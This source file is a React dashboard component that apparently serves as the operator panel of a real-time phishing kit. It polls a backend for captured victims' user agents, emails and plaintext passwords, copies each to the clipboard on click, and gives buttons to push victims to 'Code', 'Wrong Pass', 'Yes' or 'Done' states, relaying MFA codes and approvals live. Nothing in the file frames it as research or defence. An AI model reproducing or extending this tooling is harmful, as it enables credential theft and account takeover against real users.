"use client";
import { changeState, getAllData } from "@/actions";
import { useEffect, useState } from "react";
import { useToast } from "./ui/use-toast";

export default function DashboardDataTable() {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [pending, setPending] = useState({
    state: false,
    index: 0,
  });
  function copyToClipboard(text) {
    var input = document.createElement("input");
    input.value = text;
    document.body.appendChild(input);
    input.select();
    document.execCommand("copy");
    document.body.removeChild(input);
  }
  async function getData() {
    setLoading(true);
    let res = await getAllData();
    if (res) {
      setData(JSON.parse(res)["data"].reverse());
    }
    setLoading(false);
  }
  const { toast } = useToast();
  useEffect(() => {
    getData();
    setInterval(getData, 5000);
  }, []);
  if (!data) {
    return (
      <tbody>
        <tr className="text-center">
          <td className="border px-4 py-2">loading...</td>
          <td className="border px-4 py-2">loading...</td>
          <td className="border px-4 py-2">loading...</td>
          <td className="border px-4 py-2">loading...</td>
        </tr>
      </tbody>
    );
  }
  if (data.length == 0) {
    return (
      <tbody>
        <tr className="text-center">
          <td colSpan={4} className="border px-4 text-red-500  py-2">
            No Data
          </td>
        </tr>
      </tbody>
    );
  }
  return (
    <tbody>
      {loading && (
        <div className="absolute  text-xl top-5 left-1/2">Loading ..</div>
      )}
      {data.map((item, index) => (
        <tr key={index}>
          <td
            onClick={() => {
              toast({
                description: "User Agent copied to clipboard",
              });
              copyToClipboard(item.userAgent);
            }}
            className="border cursor-pointer px-4 py-2"
          >
            <div className=" md:hidden">{"User Agent"}</div>
            <div className="hidden md:block">
              {item.userAgent.split(";")[1].split(")")[0]}
            </div>
          </td>
          <td
            onClick={() => {
              toast({
                description: "Email copied to clipboard",
              });
              copyToClipboard(item.email);
            }}
            className="border cursor-pointer px-4 py-2"
          >
            <div className="md:hidden">Email</div>
            <div className="hidden md:block">{item.email}</div>
          </td>
          <td
            onClick={() => {
              toast({
                description: "Password copied to clipboard",
              });
              copyToClipboard(item.password);
            }}
            className="border cursor-pointer px-4 py-2"
          >
            <div className="md:hidden">Password</div>
            <div className="hidden md:block">{item.password}</div>
          </td>
          <td className="border px-4 py-2 min-w-10">
            <div className="flex items-center justify-center flex-col   gap-2">
              <span className="text-lg font-bold">
                {item.state} {item.state == "code" && " : " + item.code}
              </span>
              {pending.state && pending.index == index ? (
                <div>Pending..</div>
              ) : (
                <div className="flex gap-2">
                  <button
                    onClick={async () => {
                      setPending({
                        state: true,
                        index: index,
                      });
                      let code = prompt("code");
                      await changeState(item._id, "code", code);
                      await getData();
                      setPending({
                        state: false,
                      });
                    }}
                    className="bg-blue-600 rounded-3xl py-1 px-3 text-sm md:text-md "
                  >
                    Code
                  </button>
                  <button
                    onClick={async () => {
                      setPending({
                        state: true,
                        index: index,
                      });

                      await changeState(item._id, "inCorrect");
                      await getData();
                      setPending({
                        state: false,
                      });
                    }}
                    className="bg-red-600 rounded-3xl text-nowrap text-sm md:text-lg py-1 px-3"
                  >
                    Wrong Pass
                  </button>
                  <button
                    onClick={async () => {
                      setPending({
                        state: true,
                        index: index,
                      });
                      await changeState(item._id, "yes");
                      await getData();
                      setPending({
                        state: false,
                      });
                    }}
                    className="bg-blue-600 rounded-3xl py-1 px-3"
                  >
                    Yes
                  </button>
                  <button
                    onClick={async () => {
                      setPending({
                        state: true,
                        index: index,
                      });

                      await changeState(item._id, "done");
                      await getData();
                      setPending({
                        state: false,
                      });
                    }}
                    className="bg-green-600 rounded-3xl py-1 px-3"
                  >
                    Done
                  </button>
                </div>
              )}
            </div>
          </td>
        </tr>
      ))}
    </tbody>
  );
}
